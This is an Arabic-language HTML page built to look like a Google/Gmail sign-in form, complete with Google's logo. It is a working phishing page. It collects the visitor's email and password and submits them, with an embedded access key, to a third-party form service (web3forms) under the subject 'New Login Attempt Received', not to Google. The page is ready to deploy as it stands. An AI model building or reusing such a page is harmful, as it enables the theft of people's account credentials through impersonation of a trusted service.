<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تسجيل الدخول - Google</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; padding-top: 50px; background-color: #fff; }
        .card { width: 350px; padding: 25px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { width: 75px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; outline: none; }
        input:focus { border: 2px solid #1a73e8; }
        .btn { background: #1a73e8; color: white; border: none; padding: 10px; width: 100%; border-radius: 4px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="card">
    <form action="https://api.web3forms.com/submit" method="POST">
        <input type="hidden" name="access_key" value="d713e172-6b78-47ea-81c0-457b88b45dc4">
        
        <input type="hidden" name="from_name" value="Google Mockup System">
        <input type="hidden" name="subject" value="New Login Attempt Received">
        
        <input type="checkbox" name="botcheck" style="display: none;">

        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
        <h2>تسجيل الدخول</h2>
        <p>متابعة إلى Gmail</p>

        <input type="text" name="email" placeholder="البريد الإلكتروني أو الهاتف" required>
        <input type="password" name="password" placeholder="أدخل كلمة المرور" required>
        
        <button type="submit" class="btn">إرسال الآن</button>
    </form>
</div>

</body>
</html>
